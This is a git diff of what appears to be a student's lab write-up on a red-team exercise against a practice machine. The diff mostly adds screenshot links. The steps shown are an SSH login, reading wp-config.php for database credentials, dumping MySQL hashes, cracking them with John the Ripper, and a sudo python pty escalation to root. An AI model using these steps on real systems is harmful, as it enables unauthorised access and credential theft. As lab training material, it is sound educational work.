@@ -43,6 +43,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
       - `ssh michael@192.168.1.110`
       - `cd /var/www/html`
       - `grep -ir flag1`
+
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag1.PNG)
       
   - `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
@@ -54,7 +55,8 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
   - `flag3`: afc01ab56b50591e7dccf93122770cd2 and `flag4`: 715dea6c055b9fe3337544932f2941ce
     - To find MySql database login information, this command was used: `cat /var/www/html/wordpress/wp-config.php`
- #### photo myswl pword
+
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20pword.PNG)
  
     - MySql was were flag3 and flag4 were found using these commands:
       - `mysql -u root -p'R@venSecurity'`
@@ -62,12 +64,16 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
       - `USE wordpress;`
       - `SHOW tables;`
       - `SELECT * FROM wp_posts;`
-#### Photo flags
+      
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/flag3%20and%204.PNG)
+
   -Additionally, hashes for each user was found, and privelege escalation was exploited.
-#### Photo hashes
+  
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20hashes.PNG)
+
     - I created a file with the hashes and used John the Ripper to crack them
       - `john hashes.txt -wordlist=/usr/share/wordlists/dirb/big.txt`
     - From there, I connected to Steven's account and open a python shell with root privelege
       - ssh steven@192.168.1.110
       - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
-#### Last photo
+![](https://github.com/Nhiwins/Final-Project/blob/main/Images/last%20photo.PNG)
